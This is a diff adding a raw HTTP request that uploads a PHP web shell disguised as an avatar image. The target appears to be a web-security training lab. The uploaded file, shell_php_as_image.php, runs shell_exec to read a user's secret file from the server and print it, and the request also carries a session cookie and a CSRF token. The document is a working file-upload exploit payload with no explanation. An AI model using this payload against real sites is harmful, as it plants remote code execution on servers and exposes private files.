@@ -1,0 +1,42 @@
+POST /my-account/avatar HTTP/1.1
+Host: ac7c1ffa1eed086fc0a751df007d00cb.web-security-academy.net
+Cookie: session=UDqgIlmCbgRAswINX58jhGMues7oMPdx
+Content-Length: 502
+Cache-Control: max-age=0
+Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Upgrade-Insecure-Requests: 1
+Origin: https://ac7c1ffa1eed086fc0a751df007d00cb.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqiQ64btn5vyjYib6
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://ac7c1ffa1eed086fc0a751df007d00cb.web-security-academy.net/my-account
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundaryqiQ64btn5vyjYib6
+Content-Disposition: form-data; name="avatar"; filename="shell_php_as_image.php"
+Content-Type: text/php
+
+
+<?php
+$output = shell_exec('cat /home/carlos/secret');
+echo "<pre>$output</pre>";
+?>
+
+------WebKitFormBoundaryqiQ64btn5vyjYib6
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundaryqiQ64btn5vyjYib6
+Content-Disposition: form-data; name="csrf"
+
+JMOOFCrkxcdA1i2EzzoOrzcXefTbGZeh
+------WebKitFormBoundaryqiQ64btn5vyjYib6--
+
